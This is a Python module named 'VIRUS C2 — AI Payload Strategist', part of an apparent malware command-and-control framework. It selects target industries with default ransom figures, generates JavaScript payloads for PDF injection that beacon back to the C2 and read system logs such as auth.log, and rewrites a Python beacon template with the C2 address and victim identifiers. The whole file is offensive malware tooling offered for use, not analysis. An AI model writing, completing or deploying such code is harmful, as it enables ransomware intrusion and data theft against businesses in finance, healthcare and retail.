"""
VIRUS C2 — AI Payload Strategist.

Generates target-specific payloads based on AI analysis of the target
environment, threat level, and desired mutation mode.

The strategist:
  1. Takes AI context (system state, threats, mutation mode)
  2. Generates a JavaScript payload for PDF injection
  3. Generates a Python beacon executable with appropriate evasion
  4. Adjusts payload behavior based on the current mutation mode
"""

import json
import os
import time
import logging
import aiofiles
from typing import Optional, Dict, List

logger = logging.getLogger("ai_brain.payload_strategist")

# Paths to payload templates
JS_TEMPLATE_PATH = "pdfs/templates/macro.py"
PY_TEMPLATE_PATH = "pdfs/templates/executable.py"


class PayloadStrategist:
    """
    AI-driven payload generator.

    Produces JS (PDF) and Python (beacon) payloads with behavior
    mutated according to the current AI brain state.
    """

    def __init__(self, c2_server=None, ai_brain=None):
        self.c2 = c2_server
        self.brain = ai_brain

    # ── Target selection ────────────────────────────────────────────────

    def select_industry_targets(self, config: dict = None) -> list:
        """
        Read brain_config.json and return target industry names/patterns.
        Falls back to defaults if config is missing.
        """
        config_path = "brain_config.json"
        if not config and os.path.exists(config_path):
            try:
                with open(config_path) as f:
                    config = json.load(f).get("targets", {})
            except Exception:
                config = {}

        if not config:
            return ["finance", "healthcare", "retail"]

        industries = config.get("industries", {})
        return [
            {
                "industry": name,
                "names": ind.get("names", []),
                "payloads": ind.get("payloads", []),
                "ransom": ind.get("default_ransom", 50000),
            }
            for name, ind in industries.items()
        ]

    # ── JS payload generation ───────────────────────────────────────────

    async def generate_js_payload(
        self,
        node_id: str,
        watermark: str,
        mutation_mode: str = "moderate",
        target_logs: List[str] = None,
    ) -> str:
        """
        Generate a JavaScript payload for PDF injection.

        The JS payload connects to the C2 via WebSocket, reads system logs,
        and sends heartbeat data. Mutation mode adjusts beacon interval.
        """
        from pdfs.templates.macro import generate_payload_with_mutation

        c2_url = f"http://localhost:8000"
        if self.c2:
            c2_url = f"http://{self.c2.host}:{self.c2.port}"

        return generate_payload_with_mutation(
            c2_url=c2_url,
            node_id=node_id,
            watermark=watermark,
            mutation_mode=mutation_mode,
            target_logs=target_logs,
        )

    # ── Python payload generation ───────────────────────────────────────

    async def generate_python_payload(
        self,
        node_id: str,
        watermark: str,
        c2_url: str = None,
    ) -> str:
        """
        Generate a Python beacon payload with placeholders rewritten.

        Reads the executable template and rewrites C2_URL, NODE_ID,
        and WATERMARK for the specific target.
        """
        if not c2_url and self.c2:
            c2_url = f"http://{self.c2.host}:{self.c2.port}"
        if not c2_url:
            c2_url = "http://localhost:8000"

        try:
            async with aiofiles.open(PY_TEMPLATE_PATH, "r") as f:
                template = await f.read()
        except Exception:
            logger.error(f"Cannot read template: {PY_TEMPLATE_PATH}")
            return ""

        template = template.replace("http://C2_SERVER_PLACEHOLDER", c2_url)
        template = template.replace("NODE_ID_PLACEHOLDER", node_id)
        template = template.replace("WATERMARK_PLACEHOLDER", watermark)
        return template

    # ── AI-enhanced payload strategy ────────────────────────────────────

    async def generate_payload_strategy(
        self,
        node_id: str,
        watermark: str,
        target_industry: str = None,
    ) -> Dict:
        """
        Generate a complete payload strategy using AI analysis.

        Returns:
            js_payload: str — JavaScript for PDF injection
            py_payload: str — Python beacon executable
            strategy: dict — metadata about the payload
        """
        mutation_mode = "moderate"
        if self.brain:
            mutation_mode = self.brain.memory.get("last_mutation_mode", "moderate")

        target_logs = None
        if target_industry:
            targets = self.select_industry_targets()
            for t in targets:
                if t["industry"] == target_industry:
                    target_logs = t.get("names", [])
                    break

        js_payload = await self.generate_js_payload(
            node_id=node_id,
            watermark=watermark,
            mutation_mode=mutation_mode,
            target_logs=target_logs,
        )

        py_payload = await self.generate_python_payload(
            node_id=node_id,
            watermark=watermark,
        )

        strategy = {
            "node_id": node_id,
            "watermark": watermark,
            "mutation_mode": mutation_mode,
            "target_industry": target_industry or "generic",
            "target_logs": target_logs or ["/var/log/auth.log"],
            "generated_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "js_length": len(js_payload),
            "py_length": len(py_payload),
        }

        return {
            "js_payload": js_payload,
            "py_payload": py_payload,
            "strategy": strategy,
        }


# Singleton
payload_strategist = PayloadStrategist()
